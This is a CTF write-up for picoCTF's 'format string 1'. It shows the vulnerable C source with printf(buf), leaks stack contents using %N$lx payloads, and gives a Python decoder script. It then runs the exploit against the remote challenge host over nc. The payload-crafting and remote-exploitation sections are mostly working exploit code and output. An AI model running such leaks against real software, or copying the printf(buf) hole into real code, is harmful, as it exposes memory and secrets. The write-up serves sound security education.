# Format String 1

**Challenge link:** [picoCTF – format string 1](https://play.picoctf.org/practice/challenge/434?category=6&difficulty=2&originalEvent=73&page=1)

---

## Challenge Information

```text
Level:   Medium
Tags:    Binary Exploitation, picoCTF 2024, format_string, browser_webshell_solvable
Author:  syreal

Description:

Patrick and SpongeBob were really happy with the orders you made for them, but now they're curious about the secret menu. Find it, and along the way, maybe you'll find something else of interest!

Download the binary here.  
Download the source here.  

Connect to the challenge instance here:
    nc mimas.picoctf.net 51563
```

---

## Manual Exploitation

The challenge archive contains the following files:

```bash
$ ls -lah
total 28K
drwxrwxr-x  2 ap   ap   4.0K Apr 27 10:33 .
drwxrwxrwt 21 root root 4.0K Apr 27 10:27 ..
-rw-rw-r--  1 ap   ap    16K Apr 27 10:32 format-string-1
-rw-rw-r--  1 ap   ap   951  Apr 27 10:32 format-string-1.c
```

```bash
$ file format-string-1
format-string-1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=62bc37ea6fa41f79dc756cc63ece93d8c5499e89, for GNU/Linux 3.2.0, not stripped
```

`format-string-1` is a 64‑bit ELF binary that is **not stripped**:

> A binary that is *not stripped* still contains symbol information for functions and globals, which is helpful during analysis.

```bash
$ checksec --file=format-string-1
RELRO           STACK CANARY      NX            PIE             FILE
Partial RELRO   No canary found   NX enabled    No PIE          format-string-1
```

The binary has the **NX protection enable**.

```bash
$ readelf --syms format-string-1
    ...
    36: 00000000004011f6   367 FUNC    GLOBAL DEFAULT   15 main
    ...
```

The source code is provided in `format-string-1.c`:

```c
#include <stdio.h>

int main() {
  char buf[1024];
  char secret1[64];
  char flag[64];
  char secret2[64];

  FILE *fd = fopen("secret-menu-item-1.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret1, 64, fd);

  fd = fopen("flag.txt", "r");
  if (fd == NULL){
    printf("'flag.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(flag, 64, fd);

  fd = fopen("secret-menu-item-2.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret2, 64, fd);

  printf("Give me your order and I'll read it back to you:\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  printf("Bye!\n");
  fflush(stdout);

  return 0;
}
```

The goal is to **read from the stack** the content of `char flag[64]` by exploiting the `printf(buf)` vulnerability.

In local setup:

```bash
$ chmod u+x format-string-1     # executable permission
```

Defines the files that the `format-string-1` open.

```bash
$ python3 -c 'print("A"*8, end="")' > secret-menu-item-1.txt       # AAAAAAAA
$ python3 -c 'print("B"*8, end="")' > secret-menu-item-2.txt       # BBBBBBBB
$ python3 -c 'print("flag{th1s_1s_ap3zz1}", end="")' > flag.txt    # flag{th1s_1s_ap3zz1}
```

The variables on the stack are:

- `buf[1024]`
- `secret2[64]`
- `flag[64]`
- `secret1[64]`

## Local Format String Exploitation

```bash
$ ./format-string-1 
Give me your order and I'll read it back to you:
ap3zzi
Here's your order: ap3zzi
Bye!
```

```bash
$ ./format-string-1
Give me your order and I'll read it back to you:
%s
Here's your order: Here's your order:

Bye!
```

```bash
$ python3 -c 'print("%s%s%s%s%s", end="")' | ./format-string-1
Give me your order and I'll read it back to you:
Here's your order: Here's your order: (null)(null)%s%s%s%s%s

Bye!
```

Finding `buf` on the stack:

```bash
$ ./format-string-1
Give me your order and I'll read it back to you:
%5$s
Here's your order: %5$s

Bye!
```

Locating `secret2`:

```bash
$ ./format-string-1
Give me your order and I'll read it back to you:
%5$s.%6$lx
Here's your order: %5$s.%6$lx
.4242424242424242
Bye!

$ cat secret-menu-item-2.txt | xxd
00000000: 4242 4242 4242 4242                      BBBBBBBB
```

> To be more rigorous, the flag is located at a distance of **64 bytes** from the address where it is allocated secret1 on the stack.

Locatinh `flag` after secret2:

```bash
$ # The secret1 variable takes up 64 bytes (i.e. 8 qword or 8 %lx).
$ # => secret1 index + 8. 
$ ./format-string-1
Give me your order and I'll read it back to you:
%5$s.%6$lx.%14$lx
Here's your order: %5$s.%6$lx.%14$lx
.4242424242424242.3168747b67616c66
Bye!

$ cat flag.txt | xxd -p     # hexadecimal flag
666c61677b746831735f31735f6170337a7a317d

$ echo "3168747b67616c66" | xxd -p -r | xxd -p -c1 | tac | tr -d '\n'   # swap endianness
666c61677b746831
```

The leaked data represents **the least significant 8 bytes** of flag as shown above.

Check `secret2` position:

```bash
$ # The same reasoning made for flag
$ ./format-string-1
Give me your order and I'll read it back to you:
%5$s.%6$lx.%14$lx.%22$lx
Here's your order: %5$s.%6$lx.%14$lx.%22$lx
.4242424242424242.3168747b67616c66.4141414141414141
Bye!

$ cat secret-menu-item-1.txt | xxd
00000000: 4141 4141 4141 4141                      AAAAAAAA
```

## Payload Crafting

Building the payload:

```bash
$ # base = 6 (secret1)
$ # The flag begins at index `base + 8 = 14` and ends up at index `base + 16 = 22` (left out).
$ # Separator: ;
$ python3 -c 'base=6; payload=""; payload+="".join("%{}$lx;".format(i) for i in range(base+8, base+16)); print(payload)'
%14$lx;%15$lx;%16$lx;%17$lx;%18$lx;%19$lx;%20$lx;%21$lx;
```

Below is the code for creating the payload in a prettier form.
```python
base=6
payload=""
for i in range(base+8, base+16):
    payload+="".join("%{}$lx;".format(i))
print(payload)
```

Submit the payload to `format-string-1`.

```bash
$ ./format-string-1 
Give me your order and I'll read it back to you:
%14$lx;%15$lx;%16$lx;%17$lx;%18$lx;%19$lx;%20$lx;%21$lx 
Here's your order: 3168747b67616c66;3370615f73315f73;7f007d317a7a;3055e4;7ffd692ff500;78c01861bf7a;78c0189624d0;7ffd692ff460
Bye!
```

To simplify the decoding of the result, the following script `read_the_flag` was built:

```python
#!/usr/bin/env python3
from pwn import p64
from sys import argv

def swap_decode(raw):
    res = b''
    for r in raw.split(';'):
        res += p64(int(r,16), endianness='little')
    print(res)

if len(argv) > 1:
    swap_decode(argv[1])
```

Usage:

```bash
$ ./read_the_flag '3168747b67616c66;3370615f73315f73;7c007d317a7a;7ffccd952c20;7ffccd952c30;7c896f8fb211;2;7c896f8edb10'
b'flag{th1s_1s_ap3zz1}\x00...'
```

Captured!

## Remote Exploitation

Prepare the payload:

```bash
$ echo '%14$lx;%15$lx;%16$lx;%17$lx;%18$lx;%19$lx;%20$lx;%21$lx' > payload
```

Send it remotely:

```bash
$ (cat payload; cat) | nc mimas.picoctf.net 51563
Give me your order and I'll read it back to you:
Here's your order: 7b4654436f636970;355f31346d316e34;3478345f33317937;30355f673431665f;7d343663363933;7;7353ba9988d8;2300000007;
Bye!
^C
```

Decode the remote flag:

```bash
$ ./read_the_flag '7b4654436f636970;355f31346d316e34;3478345f33317937;30355f673431665f;7d343663363933;7;7353ba9988d8;2300000007'
b'picoCTF{XXXXXX_XXXXX_XXX_XXXX_XXXXXXXX}\x00...'
```

Flag: `picoCTF{XXXXXX_XXXXX_XXX_XXXX_XXXXXXXX}`

---